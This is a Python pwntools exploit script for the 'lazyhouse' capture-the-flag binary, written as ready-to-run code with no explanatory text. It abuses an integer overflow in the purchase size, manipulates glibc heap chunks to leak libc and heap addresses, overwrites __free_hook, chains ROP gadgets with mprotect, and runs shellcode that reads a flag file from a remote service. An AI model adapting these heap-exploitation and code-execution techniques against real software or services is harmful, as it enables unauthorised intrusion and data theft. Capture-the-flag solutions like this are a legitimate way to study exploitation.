#!/usr/bin/python

from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./lazyhouse"
context.terminal = ["tmux", "splitw", "-h"]

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
  """
  r.recvuntil ("-mb25 ")
  hash_seed = r.recvline ()[:-1]
  print "hash_seed:" + hash_seed
  hash_args = ["hashcash", "-mb25", hash_seed]
  pp = process (hash_args)
  pp.recvuntil ("hashcash token: ")
  r.sendline (pp.recvline ()[:-1])
  """
except:
  r = process (bin_name)

def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name)
context.word_size = elf.elfclass

libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc


def buy_house(idx, size, content):
  r.sendlineafter("choice: ", "1")
  r.sendlineafter("Index:", str(idx))
  r.sendlineafter("Size:", str(size))
  r.sendafter("House:", content)

def show_house(idx):
  r.sendlineafter("choice: ", "2")
  r.sendlineafter("Index:", str(idx))
  return r.recvuntil("$$$$$$$$$$$$$$$$$$$$$$$$$$$$")

def sell_house(idx):
  r.sendlineafter("choice: ", "3")
  r.sendlineafter("Index:", str(idx))

def upgrade_house(idx, content):
  r.sendlineafter("choice: ", "4")
  r.sendlineafter("Index:", str(idx))
  r.sendafter("House:", content)

def buy_super_house(content):
  r.sendlineafter("choice: ", "5")
  r.sendafter("House:", content)

# money cheat
polluted_size = -(((219 << 64) / 218) % (1 << 64))
r.sendlineafter("choice: ", "1")
r.sendlineafter("Index:", "0")
r.sendlineafter("Size:", str(polluted_size))

sell_house(0)

# start
for i in xrange(7):
  buy_house(0, 0x88, "Z")
  sell_house(0)
for i in xrange(7):
  buy_house(0, 0x98, "Z")
  sell_house(0)
for i in xrange(7):
  buy_house(0, 0x1f8, "Z")
  sell_house(0)

buy_house(0, 0x88, "A")
buy_house(1, 0x98, "B")
buy_house(2, 0x418, "C")
buy_house(3, 0x418, "D")
buy_house(4, 0x98, "E")
buy_house(5, 0x88, "F")

sell_house(4)
upgrade_house(0, "G"*0x88+p64(0xa0+0x420+0x420+1))
sell_house(1)

buy_house(1, 0x98, "H")

libc_leak = u64(show_house(2)[0:8])
log.success("libc leak addr : "+hex(libc_leak))

libc_base = libc_leak - 0x7fb657832ca0 + 0x7fb65764e000
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

buy_house(6, 0x88, "I")
buy_house(7, 0x88, "J")

sell_house(6)

# cleanup
sell_house(7)
sell_house(5)
sell_house(1)
sell_house(0)

buy_house(4, 0x90+0xa0+0x420+0x420-8, "K"*(0x90+0xa0-8)+p64(0x31)+"L"*0x418+p64(0x21)+"L"*0x18+p64(0x401))

#r.interactive()
sell_house(2)
sell_house(3)

#r.interactive()
heap_leak = u64(show_house(4)[0x138:0x140]) # works at remote too
log.success("heap leak addr : "+hex(heap_leak))
chunk_base = heap_leak-0x10

sell_house(4)
buy_house(4, 0x90+0xa0+0x420-8+0x10, "M"*(0x90+0xa0-8+0x10)+p64(0x421)+p64(chunk_base+0x40))
buy_house(5, 0x1f8, "N")
buy_house(6, 0x1f8, "O")

sell_house(5)
buy_house(5, 0x4b8, "P")

upgrade_house(4, "Q"*(0x90+0xa0-8+0x10)+p64(0x421)+p64(chunk_base+0x40)+"R"*0x410+p64(0x201)+p64(libc_leak-96+592)+p64(chunk_base+0x40))

buy_house(1, 0x1f8, p64(libc_leak-96+592)+p64(chunk_base+0x40))

buy_house(0, 0x398, "Z")
sell_house(0)
buy_house(0, 0x217, "PLUS")
sell_house(0)
for i in xrange(3):
  buy_house(0, 0x3a8, "Z")
  sell_house(0)


target = free_hook
log.info ("target: " + hex(target))
payload = ""
payload += "/bin/sh\0"+p64(target)*17*2 
buy_house(0, 0x1f8, payload)

do_debug ()
xchg_gadget = libc_base + 0x0000000000158023
call_mprotect = libc_base + 0x0000000000117590
how_gadget = libc_base + 0x00000000001080fc
push_rdi_ret = libc_base + 0x000000000004c745
log.info ("b * {}".format (hex(how_gadget)))
ss = p64(how_gadget)
buy_super_house(ss)

pay = p64(call_mprotect) + p64(heap_leak + 0x4ff0) 
context.arch = 'amd64'
context.os = 'linux'

sc = asm(shellcraft.amd64.open ("/home/lazyhouse/flag", 0))
sc += asm(shellcraft.amd64.read ('rax', 'rsp', 100))
sc += asm(shellcraft.amd64.write (1, 'rsp', 100))
pay2 = p64(heap_leak+0x4220) + "\x90" * 0x20 + sc
print len (pay2)
buy_house (2, 0x850, "ASDF")
buy_house (7, 0x200, pay)
buy_house (3, 0x200, pay2)

r.sendafter("choice: ", "3".ljust(0x20, "b"))
r.sendafter("Index:", "7".ljust(32,"a"))
#sell_house(0)
sell_house (3)
r.interactive()
